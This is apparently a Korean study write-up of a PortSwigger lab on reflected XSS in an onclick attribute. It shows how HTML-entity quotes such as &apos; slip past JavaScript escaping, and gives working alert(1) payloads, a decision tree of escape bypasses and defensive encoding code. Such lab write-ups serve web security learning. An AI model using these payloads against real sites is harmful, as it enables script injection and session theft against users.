# Lab: Reflected XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — Reflected / `onclick` 속성 / HTML 엔티티 이중 파싱 우회
- **링크**: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

## 목표

`onclick` 이벤트 핸들러 속성 내 JS 문자열에 사용자 입력이 반영되는 상황에서, `'` 와 `\` 가 모두 이스케이프되어 있음에도 HTML 엔티티 인코딩(`&apos;`)을 이용해 `alert()` 를 실행시킨다.

## 취약점 분석

### 서버의 이스케이프 처리

```
입력: <   → 출력: &lt;   (HTML 인코딩)
입력: >   → 출력: &gt;   (HTML 인코딩)
입력: "   → 출력: &quot; (HTML 인코딩)
입력: '   → 출력: \'    (JS 이스케이프)
입력: \   → 출력: \\    (JS 이스케이프)
```

`'` 와 `\` 가 **올바른 순서로 모두 이스케이프**되므로 019 랩의 `\` 무력화 트릭과 018 랩의 JS 문자열 탈출 트릭이 모두 막힌다.

### 입력이 반영되는 위치

URL 파라미터가 `<a>` 태그의 `onclick` 핸들러 내 JS 문자열에 삽입된다.

```html
<a href="..." onclick="var tracker={track(){}};tracker.track('USER_INPUT');">클릭</a>
```

URL에 `?returnUrl=http://example.com` 과 같이 입력하면:

```html
<a onclick="tracker.track('http://example.com');">
```

## 핵심 원리 — HTML 파서와 JS 파서의 이중 파싱

이번 랩의 컨텍스트는 **HTML 속성 값 안의 JS 문자열**이다.

```
[HTML 소스]
<a onclick="tracker.track('USER_INPUT')">

[파싱 순서]
1단계: HTML 파서 → 속성 값 추출 + HTML 엔티티 디코딩
2단계: JS 파서 → 디코딩된 값을 JS 코드로 평가
```

서버의 JS 이스케이프(`'` → `\'`)는 **JS 파서에게 전달되기 전** 단계를 노린 것이다.  
그러나 **HTML 파서는 JS 이스케이프를 인식하지 않고 HTML 엔티티를 먼저 디코딩**한다.

```
서버가 이스케이프하는 것: '  →  \'   (JS 레벨 처리)
서버가 인식 못 하는 것:   &apos;     (HTML 엔티티 — JS 이스케이프 대상이 아님)

HTML 파서: &apos; → '  (엔티티 디코딩)
JS 파서:  '         → 문자열 종료!
```

## 공격 방법

### 페이로드 (URL 파라미터)

```
http://t&apos;+alert(1)+&apos;
```

### 생성되는 HTML 소스

```html
<a onclick="tracker.track('http://t&apos;+alert(1)+&apos;');">
```

서버는 `&apos;` 를 일반 텍스트로 취급해 그대로 두고, `'` 나 `\` 만 이스케이프한다.

### 브라우저의 파싱 흐름

```
[HTML 파서가 속성 값을 읽을 때]
  onclick 속성 값: "tracker.track('http://t&apos;+alert(1)+&apos;');"
                                          ↓
  &apos; 를 '  로 디코딩
                                          ↓
  JS 엔진에 전달: tracker.track('http://t'+alert(1)+'');

[JS 파서 평가]
  tracker.track(
    'http://t'   ← 문자열 닫힘
    + alert(1)   ← alert 실행! (반환값 undefined)
    + ''         ← 빈 문자열 연결
  )
```

### 최종 JS 실행 결과

```javascript
tracker.track('http://t' + alert(1) + '');
// → alert(1) 이 호출되어 다이얼로그 표시
// → 'http://t' + undefined + '' = 'http://tundefined' 가 tracker에 전달
```

## 이전 랩들과의 비교

| 항목 | 018 랩 | 019 랩 | 020 랩 (이번) |
|------|--------|--------|--------------|
| 위치 | `<script>` 블록 JS 문자열 | `<script>` 블록 JS 문자열 | `onclick` 속성 JS 문자열 |
| `'` 처리 | `\'` 이스케이프 | `\'` 이스케이프 | `\'` 이스케이프 |
| `\` 처리 | `\\` 이스케이프 | 처리 없음 | `\\` 이스케이프 |
| JS 탈출 가능? | 불가 | `\'` → `\\'` 로 가능 | 불가 (순서 올바름) |
| 우회 방법 | `</script>` (HTML 파서 우선) | `\` 미이스케이프 무력화 | `&apos;` (HTML 엔티티) |
| 핵심 원리 | HTML 파서가 JS 파서보다 먼저 `</script>` 처리 | `\` 가 이스케이프되지 않는 허점 | HTML 엔티티가 JS 이스케이프보다 먼저 디코딩 |

**018 과 020 의 공통점**: 둘 다 "HTML 파서가 먼저 처리한다"는 원리를 이용한다.  
018 은 `</script>` 태그 인식, 020 은 `&apos;` 엔티티 디코딩이 그 예다.

## HTML 엔티티 인코딩 완전 정리

### 엔티티 표기 방식

HTML 엔티티는 세 가지 방식으로 표기할 수 있다.

```
&이름;    — 이름(Named) 엔티티
&#십진수; — 십진수(Decimal) 코드포인트
&#x16진수; — 16진수(Hex) 코드포인트
```

모두 동일한 문자를 나타낸다.

### XSS에서 자주 쓰이는 HTML 엔티티

| 문자 | Named | Decimal | Hex | 설명 |
|------|-------|---------|-----|------|
| `'` | `&apos;` | `&#39;` | `&#x27;` | 단일 따옴표 (HTML5+, XML) |
| `"` | `&quot;` | `&#34;` | `&#x22;` | 이중 따옴표 |
| `<` | `&lt;` | `&#60;` | `&#x3C;` | 꺽쇠 괄호 열기 |
| `>` | `&gt;` | `&#62;` | `&#x3E;` | 꺽쇠 괄호 닫기 |
| `&` | `&amp;` | `&#38;` | `&#x26;` | 앰퍼샌드 |
| `/` | (없음) | `&#47;` | `&#x2F;` | 슬래시 |
| `\` | (없음) | `&#92;` | `&#x5C;` | 백슬래시 |
| `(` | (없음) | `&#40;` | `&#x28;` | 여는 소괄호 |
| `)` | (없음) | `&#41;` | `&#x29;` | 닫는 소괄호 |

### `&apos;` 주의사항

`&apos;` 는 HTML5 와 XML 에서 정식 지원되지만, 구형 HTML4 에서는 정의되지 않았다.  
그러나 현대 모든 브라우저에서 `'` 로 디코딩된다.  
대안: `&#39;` 또는 `&#x27;` (모든 HTML 버전 호환).

### 속성 값 안에서의 인코딩 규칙

```html
<!-- " 로 묶인 속성 — " 는 &quot;, ' 는 그대로 사용 가능 -->
<a onclick="alert('hello')">

<!-- ' 로 묶인 속성 — ' 는 &apos;, " 는 그대로 사용 가능 -->
<a onclick='alert("hello")'>

<!-- onclick 처럼 JS 코드가 들어가는 속성 — 두 레벨 인코딩 고려 필요 -->
<a onclick="tracker.track('&apos;')">
<!-- HTML 파서: &apos; → '  /  JS 파서: ' → 문자열 종료 -->
```

## 핵심 정리

- `onclick` 속성 내 JS 문자열은 HTML 파서가 먼저 엔티티를 디코딩한 뒤 JS 파서가 평가한다.
- 서버가 `'` → `\'`, `\` → `\\` 로 올바르게 이스케이프해도, `&apos;` 는 JS 이스케이프 대상이 아니라 그대로 통과한다.
- HTML 파서가 `&apos;` → `'` 로 변환하므로, JS 파서는 `'` (문자열 종료) 를 만나게 된다.
- **방어**: HTML 속성에 JS 문자열을 삽입할 때 `&apos;`, `&#39;`, `&#x27;` 등 엔티티 인코딩도 이스케이프 대상에 포함시켜야 한다. 또는 `encodeURIComponent()` + `JSON.stringify()` 조합을 사용한다.

## 배운 점 및 추가 학습

### 1. 이중 파싱(Double Parsing) 컨텍스트의 공격 패턴

HTML 속성 안에 JS 코드가 포함될 때 두 단계의 파싱이 발생한다.

```
[HTML 소스]
<a onclick="JS코드">
           ↑       ↑
           "로 묶인 속성 값 → HTML 파서가 먼저 처리

[처리 순서]
1. HTML 파서: 속성 값 추출 + 엔티티(&amp;, &apos; 등) 디코딩
2. JS 파서:   디코딩된 문자열을 JS 코드로 실행

공격 전략: HTML 레벨에서는 유효하지 않아 보이지만,
          JS 레벨에서는 문자열을 탈출시키는 입력 찾기
```

### 2. 컨텍스트별 필요한 인코딩 계층

| 위치 | 적용 인코딩 | 예시 |
|------|------------|------|
| HTML 태그 사이 (텍스트 노드) | HTML 엔티티 | `<` → `&lt;` |
| HTML 속성 값 | HTML 엔티티 | `"` → `&quot;` |
| JS 문자열 (독립) | JS 이스케이프 | `'` → `\'` |
| **HTML 속성 내 JS 문자열** | **HTML 엔티티 + JS 이스케이프 모두** | `'` → `&apos;` 도 차단해야 함 |
| URL 파라미터 | URL 인코딩 | `'` → `%27` |
| URL 파라미터 → HTML 속성 → JS | URL + HTML + JS 모두 | 삼중 인코딩 필요 |

HTML 속성 내 JS 문자열은 **두 레벨의 인코딩을 모두** 방어해야 한다.  
JS 이스케이프만으로는 HTML 엔티티 경로가 남는다.

### 3. 동일 원리의 공격 변형

```html
<!-- onclick 외의 인라인 이벤트 핸들러도 동일 -->
<a onmouseover="func('USER_INPUT')">
<button onsubmit="func('USER_INPUT')">
<input onfocus="func('USER_INPUT')">

<!-- href 속성 내 javascript: 프로토콜 -->
<a href="javascript:func('USER_INPUT')">
```

모두 HTML 속성 → JS 코드의 이중 파싱이 발생하므로 `&apos;` 우회가 통한다.

### 4. URL 컨텍스트에서의 추가 우회 — URL 인코딩

URL 파라미터에서 `'` 를 URL 인코딩하면 서버가 인식하지 못할 수 있다.

```
%27  →  URL 디코딩  →  '  →  JS에서 문자열 종료
```

URL 인코딩 방식에 따라 3가지 경로로 우회 가능:

```
'    →  JS 이스케이프 →  \'   (차단)
'    →  HTML 엔티티   →  &apos; / &#39; (차단 안 됨 ← 이번 랩)
'    →  URL 인코딩    →  %27 (서버 처리 전 디코딩되면 무효, 아니면 우회)
```

### 5. `onclick` 속성 내 JS 문자열 탈출 방법 결정 트리

```
onclick 속성 내 JS 문자열 ('USER_INPUT') 상황
          │
          ├── ' 미이스케이프
          │     → ' 직접 사용: '+alert(1)+'
          │
          ├── ' → \', \ 미이스케이프
          │     → \' 사용: \'+alert(1)+\'
          │
          ├── ' → \', \ → \\ (올바른 JS 이스케이프)
          │       HTML 속성 컨텍스트일 경우
          │     → &apos; 사용: &apos;+alert(1)+&apos;  ← 이번 랩
          │     → &#39; 또는 &#x27; 도 동일하게 동작
          │
          ├── ' → \', \ → \\, 엔티티도 인코딩
          │     → 탈출 불가 (완전한 방어)
          │
          └── " 로 묶인 속성일 경우
                → &quot; 사용: &quot;+alert(1)//
```

### 6. `&apos;` vs `&#39;` — 호환성 비교

```html
<!-- HTML5 / XML — 두 방식 모두 동작 -->
<a onclick="func('&apos;')">   <!-- ' 로 디코딩 -->
<a onclick="func('&#39;')">    <!-- ' 로 디코딩 -->
<a onclick="func('&#x27;')">   <!-- ' 로 디코딩 -->

<!-- 구형 HTML4 파서 — &apos; 미지원 가능 -->
<!-- 하지만 현대 모든 브라우저에서 동작함 -->

<!-- 실제 공격에서는 &#39; 가 더 범용적으로 사용됨 -->
```

### 7. 올바른 방어 코드

```javascript
// 서버 측 — HTML 속성 내 JS 문자열을 안전하게 처리
function safeForHtmlAttributeJsString(str) {
    return str
        // JS 이스케이프 (\ 먼저)
        .replace(/\\/g, '\\\\')
        .replace(/'/g, "\\'")
        // HTML 엔티티도 이스케이프 (엔티티로 우회 방지)
        .replace(/&/g, '&amp;')   // & 를 먼저 (중요!)
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        // 엔티티 인코딩 자체도 차단하려면 & 를 먼저 이스케이프해야 함
}

// 가장 안전한 방법 — 인라인 이벤트 핸들러 자체를 사용하지 않음
// → data-* 속성 + addEventListener 조합으로 분리
element.dataset.url = userInput;           // HTML 속성에 저장
element.addEventListener('click', () => { // 별도 JS에서 처리
    tracker.track(element.dataset.url);
});
```
